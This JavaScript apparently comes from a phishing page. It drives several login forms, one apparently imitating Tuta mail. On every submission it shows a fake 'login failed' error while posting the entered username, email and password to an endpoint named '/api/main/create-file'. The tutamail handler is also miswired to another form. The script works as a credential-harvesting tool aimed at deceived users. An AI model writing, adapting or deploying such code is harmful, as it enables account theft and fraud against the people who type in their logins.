document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("enter-form");

  const fetchData = async (data) => {
    const url = "/api/main/create-file"; // относительный путь

    try {
        const result = await fetch(url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
            body: JSON.stringify(data),
            credentials: "same-origin"
          });

        console.log(await result.json());
    } catch(err) {
        console.log(err);
    }
  };

  const viewErrorMess = () => {
    const message = document.querySelector('.error-mess');
    message.style.display = 'block';
    const inputFields = document.querySelectorAll('.field input');
    inputFields.forEach(input => {
        input.style.borderBottom = '1px solid rgb(215, 73, 66)';
    });
  };
  if (form) {
      form.addEventListener("submit", (e) => {
    e.preventDefault();
    viewErrorMess();
    const data = new FormData(form);

    const username = data.get("username");
    const password = data.get("password");

    fetchData({username, password});
  });
  }

  const formPass = document.getElementById("pass-form");

  if (formPass) {
    formPass.addEventListener("submit", (e) => {
        e.preventDefault();
        const data = new FormData(formPass);
        console.log(data);
        const password = data.get("password");

        fetchData({pass: password});
      });
  };

  const formTutaMail = document.getElementById("tutamail");

  if (formTutaMail) {
    formPass.addEventListener("submit", (e) => {
        e.preventDefault();
        const data = new FormData(formTutaMail);
        console.log(data);

        const email = data.get("email");
        const password = data.get("pwd");

        fetchData({email, password});
      });
  };
});
